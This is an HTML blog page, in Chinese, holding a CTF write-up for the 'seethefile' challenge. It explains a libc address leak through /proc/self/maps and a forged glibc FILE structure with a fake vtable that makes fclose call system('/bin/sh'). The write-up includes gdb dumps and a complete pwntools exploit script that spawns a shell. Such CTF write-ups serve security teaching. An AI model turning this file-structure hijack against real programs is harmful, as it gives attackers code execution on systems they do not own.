@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/./favicon.ico?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/./favicon.ico?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: 'W9VSQ0GGKQ',
+      apiKey: '74aef4d13e544170be082d500082ddb0',
+      indexName: 'yuuoniy',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="IO FILE 利用">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF | IO_FILE 相关利用">
+<meta property="og:url" content="https://yuuoniy.github.io/2018/08/14/seethefile-writeup/index.html">
+<meta property="og:site_name" content="喵">
+<meta property="og:description" content="IO FILE 利用">
+<meta property="og:updated_time" content="2018-10-08T12:26:16.819Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF | IO_FILE 相关利用">
+<meta name="twitter:description" content="IO FILE 利用">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yuuoniy.github.io/2018/08/14/seethefile-writeup/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CTF | IO_FILE 相关利用 | 喵</title>
+  
+
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?0aff8f2cdbe4bb92b5d83006432c115a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">喵</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">没错就是尿尿啦</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yuuoniy.github.io/2018/08/14/seethefile-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yuuoniy">
+      <meta itemprop="description" content="世界本该是你醒来的模样">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="喵">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF | IO_FILE 相关利用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-08-14 15:52:08" itemprop="dateCreated datePublished" datetime="2018-08-14T15:52:08+08:00">2018-08-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-10-08 20:26:16" itemprop="dateModified" datetime="2018-10-08T20:26:16+08:00">2018-10-08</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/08/14/seethefile-writeup/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/08/14/seethefile-writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/08/14/seethefile-writeup/" class="leancloud_visitors" data-flag-title="CTF | IO_FILE 相关利用">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Symbols count in article: </span>
+                
+                <span title="Symbols count in article">7.9k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">7 mins.</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>IO FILE 利用<br><a id="more"></a></p>
+<h2 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先看程序</p>
+<ul>
+<li><code>openfile</code>:读取 长度为63 <code>filename</code>,打开文件,这里有溢出，因为 <code>filename</code> 大小为 <code>40</code>,但是不能覆盖到fp</li>
+<li><code>writefile</code>:输出文件 <code>magicbuf</code>，通过这个应该能泄露地址，首先要把内容写道magicbuf </li>
+<li><code>readfile</code>:从文件中读取内容到 <code>0x18</code> 长度</li>
+<li><code>closefile</code>: 这里会调用 <code>fclose</code> 函数，可以用来触发</li>
+<li><code>exit</code> : 这里 name 有溢出。可以覆盖到fp,使之指向我们伪造的fp,在调用<code>fcolse</code>时调用<code>system(&quot;bin/sh&quot;)</code></li>
+</ul>
+<p>bss data laylout<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">.bss:0804B080 filename        db 40h dup(?)           ; DATA XREF: openfile+53↑o</div><div class="line">.bss:0804B080                                         ; openfile+6D↑o ...</div><div class="line">.bss:0804B0C0                 public magicbuf</div><div class="line">.bss:0804B0C0 ; char magicbuf[416]</div><div class="line">.bss:0804B0C0 magicbuf        db 1A0h dup(?)          ; DATA XREF: openfile+33↑o</div><div class="line">.bss:0804B0C0                                         ; readfile+17↑o ...</div><div class="line">.bss:0804B260                 public name</div><div class="line">.bss:0804B260 ; char name[32]</div><div class="line">.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o</div><div class="line">.bss:0804B260                                         ; main+B4↑o</div><div class="line">.bss:0804B280                 public fp</div><div class="line">.bss:0804B280 ; FILE *fp</div><div class="line">.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r</div><div class="line">.bss:0804B280                                         ; openfile+AD↑w ...</div><div class="line">.bss:0804B280 _bss            ends</div></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>在linux系统中，文件<code>/proc/[pid]/maps</code>中记录了pid对应程序的内存区域以及权限信息等，程序自身可以通过访问/proc/self/maps文件获取这些信息，因此我们可以利用本题文件读取的功能，获取maps文件中记录的地址信息，从而获得libc的地址。</p>
+<h4 id="构造-FILE"><a href="#构造-FILE" class="headerlink" title="构造 FILE"></a>构造 FILE</h4><p><code>fp</code> 指向伪造 <code>IO_file</code>,伪造的 <code>IO_file</code> 存在，还要指向伪造的 <code>vtable，</code>  将<code>vtable-&gt;__fclose</code>覆盖为 system 地址<br>因为<code>vtable</code>中的函数调用时会把对应的<code>_IO_FILE_plus</code>指针作为第一个参数传递，因此这里我们把<code>&quot;sh&quot;</code>写入<code>_IO_FILE_plus</code>头部。<br>利用<code>name</code>覆盖，结构<br><code>| junk | fp | IO_FILE | IO_file_jumps ptr | IO_file_jumps |</code></p>
+<p>但是构造的时候需要注意：</p>
+<ol>
+<li><code>IO_FILE</code> 结构偏移<code>0x34</code>处即<code>_chain</code>字段指向的也是一个<code>FILE</code>结构，我们可以用我们伪造的<code>IO_FILE_plus</code>地址填充这个字段,发现不伪造也行。</li>
+<li>偏移<code>0x48</code>处的<code>lock</code>字段指向的是一个<code>IO_stdfile_2_lock</code>结构，本地调试时这个结构中的数据均为<code>\x00</code>；因此，我们可以用<code>\x00</code>填充<code>name</code>，然后用<code>name</code>的地址覆盖<code>lock</code>字段。</li>
+</ol>
+<p>我们在 gdb 中 通过 <code>directory ~/glibc-2.23/libio</code> 就可以看到 libc 中的代码了</p>
+<p>修改前：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">gef➤  p *((struct _IO_FILE_plus*)<span class="number">0x804B260</span>)             </div><div class="line">$<span class="number">2</span> = &#123;</div><div class="line">  file = &#123;</div><div class="line">    _flags = <span class="number">0x0</span>, </div><div class="line">    _IO_read_ptr = <span class="number">0x0</span>, </div><div class="line">    _IO_read_end = <span class="number">0x0</span>, </div><div class="line">    _IO_read_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_ptr = <span class="number">0x0</span>, </div><div class="line">    _IO_write_end = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_base = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_end = <span class="number">0x9861010</span> <span class="string">"\210$\255\373\216\024\206\tp\025\206\tp\021\206\tp\021\206\tp\021\206\tp\021\206\tp\021\206\tp\025\206\t"</span>, </div><div class="line">    _IO_save_base = <span class="number">0x0</span>, </div><div class="line">    _IO_backup_base = <span class="number">0x0</span>, </div><div class="line">    _IO_save_end = <span class="number">0x0</span>, </div><div class="line">    _markers = <span class="number">0x0</span>, </div><div class="line">    _chain = <span class="number">0x0</span>, </div><div class="line">    _fileno = <span class="number">0x0</span>, </div><div class="line">    _flags2 = <span class="number">0x0</span>, </div><div class="line">    _old_offset = <span class="number">0x0</span>, </div><div class="line">    _cur_column = <span class="number">0x0</span>, </div><div class="line">    _vtable_offset = <span class="number">0x0</span>, </div><div class="line">    _shortbuf = <span class="string">""</span>, </div><div class="line">    _lock = <span class="number">0x0</span>, </div><div class="line">    _offset = <span class="number">0x0</span>, </div><div class="line">    _codecvt = <span class="number">0x0</span>, </div><div class="line">    _wide_data = <span class="number">0x0</span>, </div><div class="line">    _freeres_list = <span class="number">0x0</span>, </div><div class="line">    _freeres_buf = <span class="number">0x0</span>, </div><div class="line">    __pad5 = <span class="number">0x0</span>, </div><div class="line">    _mode = <span class="number">0x0</span>, </div><div class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">39</span> times&gt;</div><div class="line">  &#125;, </div><div class="line">  vtable = <span class="number">0x0</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>修改后<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">gef➤   p *((struct _IO_FILE_plus*)<span class="number">0x804B260</span>)  </div><div class="line">$<span class="number">8</span> = &#123;</div><div class="line">  file = &#123;</div><div class="line">    _flags = <span class="number">0x6e69622f</span>, </div><div class="line">    _IO_read_ptr = <span class="number">0x68732f</span> &lt;error: Cannot access memory at address <span class="number">0x68732f</span>&gt;, </div><div class="line">    _IO_read_end = <span class="number">0x0</span>, </div><div class="line">    _IO_read_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_base = <span class="number">0x0</span>, </div><div class="line">    _IO_write_ptr = <span class="number">0x0</span>, </div><div class="line">    _IO_write_end = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_base = <span class="number">0x0</span>, </div><div class="line">    _IO_buf_end = <span class="number">0x804b260</span> &lt;name&gt; <span class="string">"/bin/sh"</span>, </div><div class="line">    _IO_save_base = <span class="number">0x0</span>, </div><div class="line">    _IO_backup_base = <span class="number">0x0</span>, </div><div class="line">    _IO_save_end = <span class="number">0x0</span>, </div><div class="line">    _markers = <span class="number">0x0</span>, </div><div class="line">    _chain = <span class="number">0x0</span>, </div><div class="line">    _fileno = <span class="number">0x0</span>, </div><div class="line">    _flags2 = <span class="number">0x0</span>, </div><div class="line">    _old_offset = <span class="number">0x0</span>, </div><div class="line">    _cur_column = <span class="number">0x0</span>, </div><div class="line">    _vtable_offset = <span class="number">0x0</span>, </div><div class="line">    _shortbuf = <span class="string">""</span>, </div><div class="line">    _lock = <span class="number">0x804b270</span> &lt;name+<span class="number">16</span>&gt;, </div><div class="line">    _offset = <span class="number">0x0</span>, </div><div class="line">    _codecvt = <span class="number">0x0</span>, </div><div class="line">    _wide_data = <span class="number">0x0</span>, </div><div class="line">    _freeres_list = <span class="number">0x0</span>, </div><div class="line">    _freeres_buf = <span class="number">0x0</span>, </div><div class="line">    __pad5 = <span class="number">0x0</span>, </div><div class="line">    _mode = <span class="number">0x0</span>, </div><div class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">39</span> times&gt;</div><div class="line">  &#125;, </div><div class="line">  vtable = <span class="number">0x804b2b4</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>vtable：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">gef➤   p *((struct _IO_jump_t*)<span class="number">0x804b2b4</span>)  </div><div class="line">$<span class="number">9</span> = &#123;</div><div class="line">  __dummy = <span class="number">0x0</span>, </div><div class="line">  __dummy2 = <span class="number">0x0</span>, </div><div class="line">  __finish = <span class="number">0x0</span>, </div><div class="line">  __overflow = <span class="number">0x0</span>, </div><div class="line">  __underflow = <span class="number">0x0</span>, </div><div class="line">  __uflow = <span class="number">0x0</span>, </div><div class="line">  __pbackfail = <span class="number">0x0</span>, </div><div class="line">  __xsputn = <span class="number">0x0</span>, </div><div class="line">  __xsgetn = <span class="number">0x0</span>, </div><div class="line">  __seekoff = <span class="number">0x0</span>, </div><div class="line">  __seekpos = <span class="number">0x0</span>, </div><div class="line">  __setbuf = <span class="number">0x0</span>, </div><div class="line">  __sync = <span class="number">0x0</span>, </div><div class="line">  __doallocate = <span class="number">0x0</span>, </div><div class="line">  __read = <span class="number">0x0</span>, </div><div class="line">  __write = <span class="number">0x0</span>, </div><div class="line">  __seek = <span class="number">0x804b2b4</span>, </div><div class="line">  __close = <span class="number">0xf7e24da0</span> &lt;__libc_system&gt;, </div><div class="line">  __stat = <span class="number">0x0</span>, </div><div class="line">  __showmanyc = <span class="number">0x0</span>, </div><div class="line">  __imbue = <span class="number">0x0</span></div><div class="line">&#125;</div><div class="line">gef➤</div></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">binary = <span class="string">'./seethefile'</span></div><div class="line">elf = ELF(binary)</div><div class="line">libc = elf.libc</div><div class="line"></div><div class="line">io = process(binary)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">':'</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span><span class="params">(nm)</span>:</span></div><div class="line">    menu(<span class="number">5</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(nm)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(nm)</span>:</span></div><div class="line">    menu(<span class="number">1</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(nm)</div><div class="line">    menu(<span class="number">2</span>)</div><div class="line">    menu(<span class="number">2</span>)</div><div class="line">    menu(<span class="number">3</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc address </span></div><div class="line">read_file(<span class="string">'/proc/self/maps'</span>)</div><div class="line">libc_addr = io.recvuntil(<span class="string">"r-xp"</span>)</div><div class="line">libc.address = int(libc_addr.split(<span class="string">'-'</span>)[<span class="number">-3</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</div><div class="line">log.info(<span class="string">"\033[33m"</span> + hex(libc.address) + <span class="string">"\033[0m"</span>)</div><div class="line"></div><div class="line"></div><div class="line">buffer = <span class="number">0x804b260</span> <span class="comment"># name's address </span></div><div class="line">pay = <span class="string">'/bin/sh'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\0'</span>)</div><div class="line">pay += p32(buffer)</div><div class="line">pay = pay.ljust(<span class="number">0x48</span>, <span class="string">'\0'</span>)</div><div class="line">pay += p32(buffer + <span class="number">0x10</span>) <span class="comment"># make lock point to '\x00'</span></div><div class="line">pay = pay.ljust(<span class="number">0x94</span>, <span class="string">'\0'</span>)</div><div class="line">pay += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>) <span class="comment"># vtable address,0x44 is fclose's offset </span></div><div class="line">pay += p32(libc.symbols[<span class="string">'system'</span>]) <span class="comment"># 0x804b260+0x94 + 4 =0x804b2f8 </span></div><div class="line"><span class="comment">#gdb.attach(io)</span></div><div class="line">leave_name(pay)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<p>vtable 结构<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">const struct _IO_jump_t _IO_file_jumps =  </div><div class="line">&#123;  </div><div class="line">  JUMP_INIT_DUMMY,  </div><div class="line">  JUMP_INIT(finish, INTUSE(_IO_file_finish)),  </div><div class="line">  JUMP_INIT(overflow, INTUSE(_IO_file_overflow)),  </div><div class="line">  JUMP_INIT(underflow, INTUSE(_IO_file_underflow)),  </div><div class="line">  JUMP_INIT(uflow, INTUSE(_IO_default_uflow)),  </div><div class="line">  JUMP_INIT(pbackfail, INTUSE(_IO_default_pbackfail)),  </div><div class="line">  JUMP_INIT(xsputn, INTUSE(_IO_file_xsputn)),</div><div class="line">  JUMP_INIT(xsgetn, INTUSE(_IO_file_xsgetn)),  </div><div class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),  </div><div class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),  </div><div class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf), </div><div class="line">  JUMP_INIT(sync, _IO_new_file_sync),  </div><div class="line">  JUMP_INIT(doallocate, INTUSE(_IO_file_doallocate)),  </div><div class="line">  JUMP_INIT(read, INTUSE(_IO_file_read)),  </div><div class="line">  JUMP_INIT(write, _IO_new_file_write),  </div><div class="line">  JUMP_INIT(seek, INTUSE(_IO_file_seek)),  </div><div class="line">  JUMP_INIT(close, INTUSE(_IO_file_close)),  </div><div class="line">  JUMP_INIT(stat, INTUSE(_IO_file_stat)),  </div><div class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),  </div><div class="line">  JUMP_INIT(imbue, _IO_default_imbue)  </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p><code>IO FILE</code> 结构<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> _IO_FILE</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> _flags;                <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_end;        <span class="comment">/* End of get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_read_base;        <span class="comment">/* Start of putback+get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_ptr;        <span class="comment">/* Current put pointer. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_write_end;        <span class="comment">/* End of put area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_buf_base;        <span class="comment">/* Start of reserve area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></div><div class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></div><div class="line">  <span class="keyword">struct</span> _IO_marker *_markers;</div><div class="line">  <span class="keyword">struct</span> _IO_FILE *_chain;</div><div class="line">  <span class="keyword">int</span> _fileno;</div><div class="line">  <span class="keyword">int</span> _flags2;</div><div class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></div><div class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</div><div class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</div><div class="line">  _IO_lock_t *_lock;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p><code>__flags</code> 记录 <code>FILE</code> 结构体的一些状态；<br><code>_markers</code> 为指向 <code>markers</code> 结构体的指针变量，存放流的位置的单向链表；<br><code>_chain</code> 变量为一个单向链表的指针，记录进程中创建的 <code>FILE</code> 结构体。</p>
